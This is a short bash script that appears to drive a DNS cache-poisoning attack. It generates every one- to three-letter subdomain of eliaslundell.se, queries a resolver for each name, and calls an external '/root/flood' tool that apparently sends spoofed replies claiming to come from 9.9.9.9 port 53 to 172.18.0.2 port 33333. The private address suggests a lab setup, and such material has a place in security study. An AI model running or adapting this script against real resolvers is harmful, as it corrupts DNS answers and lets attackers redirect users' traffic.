#!/bin/bash

generate_columns_while() {
    local max_length=${1:-2}
    local queue=({a..z})

    while ((${#queue[@]})); do
        # Pop first element
        local current=${queue[0]}
        queue=("${queue[@]:1}")

        dig @dns_server $current.eliaslundell.se &
        with_dot="$current."
        /root/flood 9.9.9.9 53 172.18.0.2 33333 $current.eliaslundell.se ${#with_dot} 1
        read -p "Press enter to continue"

        if (( ${#current} < max_length )); then
            for c in {a..z}; do
                queue+=("$current$c")
            done
        fi
    done
}

generate_columns_while 3
